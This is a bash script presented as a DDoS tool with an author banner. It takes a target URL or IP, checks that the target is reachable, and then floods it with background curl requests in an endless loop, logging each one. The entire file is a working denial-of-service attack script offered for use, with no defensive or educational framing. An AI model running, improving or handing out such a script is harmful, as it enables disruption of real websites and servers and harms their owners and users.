#!/bin/bash

# Clear the screen
clear

# VARIABLES
target=$1
count=0
logfile="ddos_attack.log"

# Colors
RED="\e[31m"        # Classic RED
GREEN="\e[32m"      # Classic GREEN
YELLOW="\e[33m"     # Classic YELLOW
BLUE="\e[34m"       # Classic BLUE
PURPLE="\e[35m"     # Classic PURPLE
BG_RED="\e[41m"     # Background RED
BG_GREEN="\e[42m"   # Background GREEN
BG_YELLOW="\e[43m"  # Background YELLOW
BG_BLUE="\e[44m"    # Background BLUE
BG_PURPLE="\e[45m"  # Background PURPLE
NE="\e[0m"          # No color

# Functions

# Display Banner with Time
function BANNER() {
    echo -e "${PURPLE}";
    echo "";
    echo "█▀█ █ █▄░█ █▀█ █▄█   ▀▄▀ █▀█ █░░ █▀█ █ ▀█▀ █▀ █▀▀ █▀▀  
█▀▀ █ █░▀█ █▄█ ░█░   █░█ █▀▀ █▄▄ █▄█ █ ░█░ ▄█ ██▄ █▄▄  ";
    echo -e "        CREATED BY JOHN FRETS BECAMON ${NE}"
    echo -e "${BLUE}Attack started at: $(date)${NE}"
    echo
}

# Validate if the target is a valid URL or IP
function VALIDATE_TARGET() {
    if [[ -z "$target" ]]; then
        echo -e "${RED}No Target Provided!${NE}"
        exit 1
    fi

    # Check if target is a valid URL or IP
    if [[ ! "$target" =~ ^http[s]?://[a-zA-Z0-9.-]+$ ]] && [[ ! "$target" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo -e "${RED}Invalid target URL or IP address!${NE}"
        exit 1
    fi
}

# Perform the DDOS attack
function DDOS_SERVER() {
    echo -e "${GREEN}Starting attack on ${YELLOW}$target${NE}"

    # Ensure the target is reachable
    if ! curl --silent --head --fail "$target" > /dev/null; then
        echo -e "${RED}Target is unreachable!${NE}"
        exit 1
    fi

    echo -e "${BLUE}Sending requests...${NE}"

    # Use xargs or parallel for faster requests
    while true; do
        count=$((count + 1))
        curl --silent "$target" > /dev/null &  # Run in background for parallel execution
        echo -e "${BLUE}(${YELLOW}$count${BLUE}) - [${YELLOW}$target${BLUE}] => ${GREEN}Request Sent${NE}"

        # Log the attack progress
        echo "$(date) - Attack on $target - Request #$count sent" >> "$logfile"

        # Limiting requests to avoid too many background processes
        if (( count % 10 == 0 )); then
            wait  # Wait for a batch of requests to complete every 10th iteration
        fi
    done
}

# Main function
function main() {
    BANNER
    VALIDATE_TARGET
    DDOS_SERVER
}

# Call the main function
main
